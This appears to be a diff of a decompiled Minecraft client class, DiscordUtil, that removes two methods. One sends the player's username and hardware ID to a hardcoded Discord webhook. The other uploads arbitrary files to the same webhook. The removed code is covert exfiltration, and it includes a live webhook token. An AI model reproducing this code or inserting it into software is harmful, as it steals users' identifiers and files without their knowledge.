@@ -21,12 +21,7 @@ import java.util.Date;
 import net.minecraft.client.Minecraft;
 
 public class DiscordUtil {
-    public static void sendInfo() {
-        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd 'at' HH:mm:ss z");
-        Date date = new Date(System.currentTimeMillis());
-        System.out.println(formatter.format(date));
-        DiscordUtil.sendMsg("```" + date + " Firework client is running by " + Minecraft.getMinecraft().getSession().getUsername() + "``````Hwid is: " + HwidUtil.getHwid() + "```", "https://discord.com/api/webhooks/974610221953581096/JyZzDORGjrDNF8xtg_JT5zbqwJeXDldjqHnMiOK17JPd5XoyzPqVzrGnm2Hta8LFOLec");
-    }
+
 
     /*
      * WARNING - Removed try catching itself - possible behaviour change.
@@ -72,26 +67,7 @@ public class DiscordUtil {
         System.out.println(result.toString());
     }
 
-    public static void sendFile(File file) throws Exception {
-        String boundary = Long.toHexString(System.currentTimeMillis());
-        HttpURLConnection connection = (HttpURLConnection)new URL("https://discord.com/api/webhooks/974610221953581096/JyZzDORGjrDNF8xtg_JT5zbqwJeXDldjqHnMiOK17JPd5XoyzPqVzrGnm2Hta8LFOLec").openConnection();
-        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
-        connection.setRequestProperty("User-Agent", "Mozilla/5.0");
-        connection.setDoOutput(true);
-        try (OutputStream os = connection.getOutputStream();){
-            os.write(("--" + boundary + "\n").getBytes());
-            os.write(("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"\n\n").getBytes());
-            try (FileInputStream inputStream = new FileInputStream(file);){
-                int fileSize = (int)file.length();
-                byte[] fileBytes = new byte[fileSize];
-                ((InputStream)inputStream).read(fileBytes, 0, fileSize);
-                os.write(fileBytes);
-            }
-            os.write(("\n--" + boundary + "--\n").getBytes());
-        }
-        connection.getResponseCode();
-        Thread.sleep(500L);
-    }
+
 
     public static void OpenServer() {
         try {
